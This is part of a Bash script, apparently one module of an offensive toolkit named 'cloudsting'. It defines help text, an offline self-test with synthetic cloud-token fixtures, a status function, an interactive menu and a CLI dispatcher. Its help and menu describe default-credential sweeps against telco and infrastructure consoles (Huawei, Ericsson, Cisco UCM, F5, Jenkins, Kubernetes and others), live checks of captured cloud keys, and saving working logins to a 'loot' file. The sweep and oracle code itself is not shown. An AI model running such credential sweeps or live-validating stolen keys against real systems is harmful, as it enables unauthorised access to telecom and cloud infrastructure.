cred_telco_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

cred_telco_cmd_help() {
    cat <<'HELP'
cloudsting module 01 — Telco Auth Oracles v1.0.0
  --detect <base-url>                    which vendor console is this?
  --sweep <base-url> [vendor]            default credentials, every vendor
  --sweep <vendor-id> <base-url>         default credentials, one vendor
  --login <vendor> <base> <user> [pass]  one explicit credential
  --defaults                             the credential list the sweep uses
  --list                                 the vendor table
  --status-tsv | --menu | --selftest | --help

Huawei U2000/iManager, Ericsson ENM, ZTE NetNumen, Nokia NSP, Mitel MiVoice,
Oracle WebLogic, Tomcat, Cisco UCM, F5 BIG-IP, Rancher, Portainer, Jenkins,
Zabbix, Nagios and the raw Kubernetes API. Each row in the vendor table is a
path, a method, a body template and a success marker — that is the whole
oracle. A 200 without the marker is not a hit.

Passwords never print. Hits carry the account name and a fingerprint; the
working pair lands in loot/telco_auth/hits-<run>.tsv, mode 600.

Environment: TA_TIMEOUT (10), TA_MAX_PASS (0 = no cap), TA_FOLLOW (0|1), TA_UA
HELP
}

# ═══════════════════════════════════════════════════════════════════
#  self-test — fully offline, no network, no provider calls
# ═══════════════════════════════════════════════════════════════════

cred_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    # synthetic fixtures — well-known shapes, never real credentials
    local aws_key="AKIAIOSFODNN7EXAMPLE"
    local aws_sesk="ASIAIOSFODNN7EXAMPLE"
    local do_tok="dop_v1_a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a"
    local gh_pat="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a"
    local sk_test="sk_test_4eC39HqLyjWDarjtT1zdp7dc"
    local anthropic="sk-ant-api03-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    local gkey="AIzaSyA-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    local token_prefix="xoxb-000000000000-0000000000000-aaaaaaaaaaaaaaaaaaaaaaaa"
    local -a TOKENS=("$aws_key" "$aws_sesk" "$do_tok" "$gh_pat" "$sk_test" "$anthropic" "$gkey" "$token_prefix")
    local -a PROVIDERS=(aws aws digitalocean github stripe anthropic google slack)

    local i p0 k0
    for i in "${!TOKENS[@]}"; do
        p0="$(cred_detect_from_text "${TOKENS[$i]}" 2>/dev/null | cut -d'|' -f1)"
        chk "detect-${PROVIDERS[$i]}" "$p0" "${PROVIDERS[$i]}"
    done

    # GCP SA JSON shape
    local sa_json='{"type":"service_account","project_id":"selftest-proj","client_email":"sa@selftest-proj.iam.gserviceaccount.com","private_key":"-----BEGIN PRIVATE KEY-----\nMIIB\n-----END PRIVATE KEY-----\n","token_uri":"https://oauth2.googleapis.com/token"}'
    local d
    d="$(cred_detect_from_text "$sa_json")"
    chk detect-gcp-sa-json "$(printf '%s' "$d" | cut -d'|' -f1-3)" 'gcp|service-account-json|json'

    # Azure SP shape
    local az_json='{"clientId":"00000000-0000-0000-0000-000000000000","clientSecret":"abc","accessToken":"x","tenantId":"00000000-0000-0000-0000-000000000000"}'
    d="$(cred_detect_from_text "$az_json")"
    chk detect-azure-sp "$(printf '%s' "$d" | cut -d'|' -f1-3)" 'azure|service-principal-credentials|json'

    # JWT shape (unsigned header/payload, dummy signature — never leaves the box)
    local jwt64="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJzdWIiOiIxMjM0NTY3ODkwIn0.DUMMYDUMMY"
    d="$(cred_detect_from_text "$jwt64")"
    chk detect-jwt-shape "$(printf '%s' "$d" | cut -d'|' -f2)" 'jwt'

    # jwt decode: iss claim round-trips
    cred_jwt_classify "$jwt64" >/dev/null 2>&1
    chk jwt-classify-rc "$?" 0

    # format validation prints the provider in field 1
    cred_format_validate aws access-key-id "$aws_key" > "$TMP_DIR/st_ftsv" 2>&1
    chk fv-aws-provider "$(awk -F'\t' '$1=="provider"{print $2}' "$TMP_DIR/st_ftsv")" aws
    chk fv-aws-format-ok "$(awk -F'\t' '$1=="format"{print $2}' "$TMP_DIR/st_ftsv" | grep -c '^ok')" 1

    # base64url decode round-trip
    chk b64url-roundtrip "$(b64url_decode "$(printf 'hello-cloudsting' | base64 -w0 | tr '+/' '-_' | tr -d '=')" )" hello-cloudsting

    # unknown input stays honest
    d="$(cred_detect_from_text 'zzz not a credential ever')"
    chk detect-unknown-honest "$(printf '%s' "$d" | cut -d'|' -f1)" unknown

    # status TSV shape
    local out
    out="$(cred_status_tsv)"
    chk status-fields "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=2{c++} END{print c+0}')" 0
    chk status-module "$(printf '%s\n' "$out" | awk -F'\t' '$1=="module"{print $2}')" '01_cred_validate'

    # menu dispatch never crashes on unknown choice
    printf '9\nq\n' | cred_menu >/dev/null 2>&1
    chk menu-dispatch "$?" 0

    rm -f "$TMP_DIR/st_ftsv"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# TSV status for the GUI/CLI protocol
cred_status_tsv() {
    printf 'module\t01_cred_validate\n'
    printf 'state\tok\n'
    printf 'runs_logged\t%s\n' "$(ls "$CREDOOT" 2>/dev/null | grep -c '^result-')"
    printf 'formats_known\t%s\n' "${#CRED_PREFIXES[@]}"
    printf 'live_paths\taws,gcp,github,slack,jwt\n'
    printf 'vendor_oracles\t%s\n' "$(ta_vendor_ids | wc -l | tr -d ' ')"
    printf 'vendor_defaults\t%s\n' "$(ta_defaults | wc -l | tr -d ' ')"
}

# ═══════════════════════════════════════════════════════════════════
#  interactive menu
# ═══════════════════════════════════════════════════════════════════

cred_menu() {
    while true; do
        printf '\n=== 01 — Cloud Credential Validator ===\n'
        printf '  1) detect a credential (file or stdin)\n'
        printf '  2) validate live (runs format + probe)\n'
        printf '  3) list known fingerprints\n'
        printf '  5) vendor auth oracles (telco)\n'
        printf '  6) default credential sweep\n'
        printf '  4) status TSV\n'
        printf '  0) back\n'
        read -rp '  choice> ' c
        case "$c" in
            1) read -rp '  path or press enter for stdin> ' p
               [[ -z "$p" ]] && p="-"
               cred_detect_input "$p" ;;
            2) read -rp '  path or press enter for stdin> ' p
               [[ -z "$p" ]] && p="-"
               cred_validate "$p" ;;
            3) local e; for e in "${CRED_PREFIXES[@]}"; do printf '\t%s\n' "$e"; done ;;
            4) cred_status_tsv ;;
            5) cred_telco_cmd_list ;;
            6) local b; read -rp '  base url> ' b; cred_telco_cmd_sweep "$b" ;;
            0|q) return 0 ;;
            *) printf '  unknown choice\n' ;;
        esac
    done
}

# ═══════════════════════════════════════════════════════════════════

cred_usage() {
    cat <<EOF
Usage: $(basename "$0") VERB [ARGS]
  --detect FILE|-|STRING     identify provider/kind, offline only
  --validate FILE|-|STRING   detect + online live-check where possible
  --list-formats             known (provider|prefix|kind) table
  --detect-vendor URL        which vendor console is this?
  --sweep URL [VENDOR]       default passwords against every vendor oracle
  --sweep VENDOR URL         default passwords against one vendor oracle
  --login VENDOR URL U [P]   one explicit credential against one oracle
  --vendors                  the vendor oracle table
  --defaults                 the credential list the sweep uses
  --status-tsv               module status for CLI/GUI protocol
  --menu                     interactive menu
  --selftest                 offline test suite
  --help
EOF
}

cred_main() {
    case "${1:-}" in
        --detect)     shift; cred_detect_input "${1:-}" ;;
        --validate)   shift; cred_validate "${1:-}" ;;
        --list-formats) for e in "${CRED_PREFIXES[@]}"; do printf '%s\n' "$e"; done ;;
        --vendors)    cred_telco_cmd_list ;;
        --detect-vendor) shift; cred_telco_cmd_detect "${1:-}" ;;
        --sweep)      shift; cred_telco_cmd_sweep "$@" ;;
        --login)      shift; cred_telco_cmd_login "$@" ;;
        --defaults)   cred_telco_cmd_defaults ;;
        --status-tsv) cred_status_tsv ;;
        --menu)       cred_menu ;;
        --selftest)   cred_selftest ;;
        --help|--help|-h) cred_usage ;;        *)            cred_usage >&2; exit 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    cred_main "$@"
fi
